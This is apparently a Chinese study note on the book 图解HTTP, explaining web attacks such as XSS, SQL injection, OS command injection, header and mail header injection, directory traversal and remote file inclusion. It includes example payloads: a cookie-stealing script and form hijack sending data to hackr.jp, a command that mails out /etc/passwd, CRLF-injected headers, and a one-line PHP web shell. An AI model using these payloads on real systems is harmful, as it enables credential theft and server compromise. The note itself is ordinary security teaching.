# 图解 HTTP 笔记 2

## 网络安全

- **HTTP** 不具备必要的安全功能 

  在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期数据不相同的内容。 

  在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。 通过 URL查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传 入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或 被攻击者拿到管理权限。 

#### 对 Web 应用的攻击模式

- 主动攻击：主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。主动攻击模式里具有代表性的攻击是 SQL注入攻击和 OS 命令注入攻击。 

![1565751343650](images/1565751343650.png)

- 被动攻击 ：被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。 

  被动攻击通常的攻击模式如下所示。 

  - 步骤 **1**： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。 

  - 步骤 **2**： 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。 

  - 步骤 **3**： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。 

  - 步骤 **4**： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。 

  被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。 

![1565751375692](images/1565751375692.png)

#### 针对常规输入输出的安全对策

- 客户端的验证 

  多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范 对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI 体验的作用。 

- Web 应用端（服务器端）的验证

  - 输入值验证
  - 输出值转义

  Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。 

#### 跨站脚本攻击

跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML标签或 JavaScript 进行的一种攻击。动态创建的 HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。 

跨站脚本攻击有可能造成以下影响。

- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的 **Cookie** 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。 

##### 攻击案例

- ###### 在动态生成 **HTML** 处发生

![1565752175830](images/1565752175830.png)**XSS** 是攻击者利用预先设置的陷阱触发的被动攻击跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。

![1565752318382](images/1565752318382.png)

浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。 

之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。 

http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s=" 对请求时对应的HTML源代码

> &lt;div&gt;  
> &lt;div class=&quot;logo&quot;&gt;   
> 	&lt;img src=&quot;/img/logo.gif&quot; alt=&quot;E! 拍卖会 /&gt;  
> &lt;/div&gt;  
> &lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;  
> 	&lt;div class=&quot;input_id&quot;&gt;  
> 		ID  
> 		&lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document.getElementById(&quot;login&quot;);f.action=&quot;http://hackr.jp/pwget&quot;; f.method=&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot; /&gt;  
> 	&lt;/div&gt;  
> &lt;/form&gt;  
> &lt;/div>    

- ###### 对用户 **Cookie** 的窃取攻击 

除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。 

> <script src=http://hackr.jp/xss.js></script> 

该脚本内指定的 http://hackr.jp/xss.js 文件。即下面这段采用 JavaScript 编写的代码。 

> var content = escape(document.cookie);
>
> document.write("<img src=http://hackr.jp/?");
>
> document.write(content);
>
> document.write(">"); 

在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然 后这些信息会发送至攻击者的 Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了。

![1565753091067](images/1565753091067.png)

- ###### SQL 注入

SQL是用来操作关系型数据库管理系统（Relational DataBase Management System，RDBMS）的数据库语言。

SQL注入（SQLInjection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。 

Web 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用 SQL语句连接数据库进行特定的操作。如果在调用 SQL语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法 SQL语句。 

- SQL注入攻击有可能会造成以下等影响。
  - 非法查看或篡改数据库内的数据
  - 规避认证
  - 执行和数据库服务器业务关联的程序等 

![1565836855276](images/1565836855276.png)

正常SQL操作语句：

> SELECT * FROM bookTbl WHERE author = '上野宣' and flag = 1; 

![1565836939002](images/1565836939002.png)

被修改的SQL语句：

> SELECT * FROM bookTbl WHERE author ='上野宣' - -' and flag=1; 

SQL语句中的 -- 之后全视为注释。即，and flag=1 这个条件被自动忽略了。 

- ###### OS 命令注入

OS 命令注入攻击（OS Command Injection）可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell 时存在疏漏，就可以执行插入的非法 OS 命令。 

OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。 

正常处理网页上表单：

> my $adr = $q->param('mailaddress');
>
> open(MAIL, "| /usr/sbin/sendmail $adr");
>
> print MAIL "From: info@example.com\n"; 

程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。 

攻击者将下面的值指定作为邮件地址。 

> ; cat /etc/passwd | mail hack@example.jp 

程序接收该值，构成以下的命令组合。 

> | /usr/sbin/sendmail **; cat /etc/passwd** | **mail hack@example.jp** 

攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。 

可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail hack@example.jp 这样的命令了。结果，含有Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。 

- ###### HTTP首部注入

攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。

向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。 

如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。 

> Location: http://www.example.com/a.cgi?q=**12345**
>
> Set-Cookie: UID=**12345**
>
> ＊12345就是插入值

- HTTP 首部注入攻击有可能会造成以下一些影响。
  - 设置任何 **Cookie** 信息
  - 重定向至任意 **URL**
  - 显示任意的主体（**HTTP** 响应截断攻击） 

攻击者以下面的内容替代之前的类别 ID 后发送请求。 

> 101**%0D%0ASet-Cookie:+SID=123456789**

其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。发送该请求之后，假设结果返回以下响应。

> Location: http://example.com/?cat=101（%0D%0A ：换行符）Set-Cookie: SID=123456789 

此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。

- HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。

> %0D%0A%0D%0A<HTML><HEAD><TITLE>之后，想要显示的网页内容 <!--

在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。 

> Set-Cookie: UID=（%0D%0A ：换行符）
>
> （%0D%0A ：换行符）
>
> <HTML><HEAD><TITLE>之后，想要显示的网页内容 <!--（原来页面对应的首部字段和主体部分全视为注释） 

利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。 

- 另外，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓 存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的 Web 网页。 

- ###### 邮件首部注入

邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。 

攻击者将以下数据作为邮件地址发起请求。 

> bob@hackr.jp**%0D%0ABcc: user@example.com** 

%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。 

另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送。 

> bob@hackr.jp**%0D%0A%0D%0A**Test Message 

再以相同的方法，就有可能改写 To 和 Subject 等任意邮件首部，或向文本添加附件等动作。 

- 目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。 

通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用 .../ 等相对路径定位到 /etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。 

固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。 

以下查询字段，指定某个文件名。然后从 /www/log/ 文件目录下读取这个指定的文件。 

> http://example.com/read.php?log=**0401.log** 

攻击者设置如下查询字段后发出请求。 

> http://example.com/read.php?log=**../../etc/passwd** 

查询字段为了读取攻击者盯上的 /etc/passwd 文件，会从 /www/log/ 目录开始定位相对路径。如果这份 read.php 脚本接受 对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。 

![1565844693263](images/1565844693263.png)

http://example.com/foo.php 的源代码（部分摘录） 

> $modname = $_GET['mod'];
>
> include($modname); 

攻击者指定如同下面形式的 URL发出请求。 

> http://example.com/foo.php?mod=**http://hackr.jp/cmd.php&cmd=ls** 

攻击者已事先在外部服务器上准备了以下这段脚本。 

> http://hackr.jp/cmd.php 的源代码
>
> <? system($_GET['cmd']) ?> 

假设 Web 服务器（example.com）的 include 可以引入外部服务器的 URL，那就会读入攻击者在外部服务器上事先准备的 URL（http://hackr.jp/cmd.php）。结果，通过 system 函数就能在 Web 服务器（example.com）上执行查询字段指定的 OS 命令了。 

![1565859608457](images/1565859608457.png)

- ###### 强制浏览

强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。 

- 强制浏览有可能会造成以下一些影响。
  - 泄露顾客的个人信息等重要情报
  - 泄露原本需要具有访问权限的用户才可查阅的信息内容
  - 泄露未外连到外界的文件 

![1565860182792](images/1565860182792.png)